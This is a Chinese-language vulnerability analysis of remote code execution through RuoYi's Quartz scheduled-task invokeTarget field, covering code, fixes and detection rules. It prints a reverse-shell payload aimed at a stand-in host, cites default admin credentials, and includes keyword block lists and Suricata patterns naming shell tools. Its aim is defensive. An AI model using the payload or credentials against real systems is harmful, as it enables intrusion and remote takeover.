# RuoYi Quartz RCE 漏洞技术分析

## 漏洞概述

**漏洞名称:** RuoYi 定时任务远程代码执行漏洞  
**漏洞类型:** 代码注入 / 远程代码执行  
**影响组件:** Quartz 定时任务调度模块  
**漏洞位置:** `com.ruoyi.quartz.controller.SysJobController`

## 技术细节

### 代码分析

漏洞存在于 `SysJobController.add()` 方法中：

```java
@PostMapping("/add")
@ResponseBody
public AjaxResult addSave(@RequestBody SysJob job) {
    // 缺少对 invokeTarget 的严格验证
    job.setCreateBy(getLoginName());
    return toAjax(jobService.insertJob(job));
}
```

`SysJob` 实体类：

```java
public class SysJob extends BaseEntity {
    private String jobName;         // 任务名称
    private String jobGroup;        // 任务组名
    private String invokeTarget;    // 调用目标字符串 ⚠️ 漏洞点
    private String cronExpression;  // cron执行表达式
    private String misfirePolicy;   // 计划执行错误策略
    private String concurrent;      // 是否并发执行
    private String status;          // 状态
}
```

### 漏洞触发流程

1. **请求接收**
   - 用户通过 `POST /monitor/job/add` 提交表单
   - `invokeTarget` 参数被绑定到 `SysJob.invokeTarget`

2. **数据存储**
   - 任务信息被保存到数据库 (表: sys_job)
   - 未对 `invokeTarget` 进行危险字符过滤

3. **任务调度**
   - Quartz 调度器加载任务配置
   - 使用 `BeanInvokingJobDetailFactoryBean` 或类似机制
   - 通过反射调用目标方法

4. **代码执行**
   - 如果 `invokeTarget` 包含 SpEL 表达式或脚本代码
   - 表达式被解析并执行，导致 RCE

### 漏洞示例

正常调用：
```
invokeTarget=ryTask.ryNoParams
```

恶意调用：
```
invokeTarget=ryTask.run('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
```

## 漏洞利用条件

1. **认证要求**
   - 需要有效的管理员会话
   - 默认凭据: admin/admin123

2. **权限要求**
   - 需要 `monitor:job:add` 权限
   - 通常是管理员角色

3. **网络要求**
   - 能够访问 `/monitor/job` 端点
   - 能够提交 POST 请求

## 修复建议

### 方案 1: 白名单验证 (推荐)

```java
@PostMapping("/add")
@ResponseBody
public AjaxResult addSave(@RequestBody SysJob job) {
    // 白名单验证
    String invokeTarget = job.getInvokeTarget();
    if (!isValidInvokeTarget(invokeTarget)) {
        return AjaxResult.error("非法的调用目标");
    }
    job.setCreateBy(getLoginName());
    return toAjax(jobService.insertJob(job));
}

private boolean isValidInvokeTarget(String target) {
    // 只允许特定格式的调用目标
    // 例如: beanName.methodName 或 beanName.methodName('param')
    String pattern = "^[a-zA-Z][a-zA-Z0-9]*\\.[a-zA-Z][a-zA-Z0-9]*$";
    return target.matches(pattern) || 
           target.matches(pattern + "\\('[a-zA-Z0-9]+'\\)");
}
```

### 方案 2: 危险字符过滤

```java
private static final String[] DANGEROUS_CHARS = {
    ";", "|", "&", "$", "`", "\\", "<", ">", "(", ")", "{", "}",
    "bash", "sh", "cmd", "powershell", "python", "perl"
};

private boolean containsDangerousChars(String target) {
    for (String dangerous : DANGEROUS_CHARS) {
        if (target.toLowerCase().contains(dangerous)) {
            return true;
        }
    }
    return false;
}
```

### 方案 3: 禁用表达式解析

修改 Quartz 配置，禁用 SpEL 表达式解析：

```java
// 在 SchedulerConfig 中
@Bean
public SchedulerFactoryBean schedulerFactoryBean(DataSource dataSource) {
    SchedulerFactoryBean factory = new SchedulerFactoryBean();
    factory.setDataSource(dataSource);
    // 禁用表达式支持
    factory.setJobFactory(new SimpleJobFactory());
    return factory;
}
```

## 检测方法

### 日志检测

监控以下特征：

```sql
-- 查询可疑的定时任务
SELECT * FROM sys_job 
WHERE invokeTarget LIKE '%bash%' 
   OR invokeTarget LIKE '%sh -%'
   OR invokeTarget LIKE '%python%'
   OR invokeTarget LIKE '%curl%'
   OR invokeTarget LIKE '%wget%';
```

### 流量检测

Suricata/Snort 规则：

```
alert http any any -> any any (
    msg:"RuoYi Quartz RCE Attempt";
    content:"POST";
    http_method;
    content:"/monitor/job/add";
    http_uri;
    content:"invokeTarget";
    http_client_body;
    pcre:"/invokeTarget=.*?(bash|sh\s+-|python|perl|ruby|curl|wget)/i";
    classtype:web-application-attack;
    sid:1000001;
    rev:1;
)
```
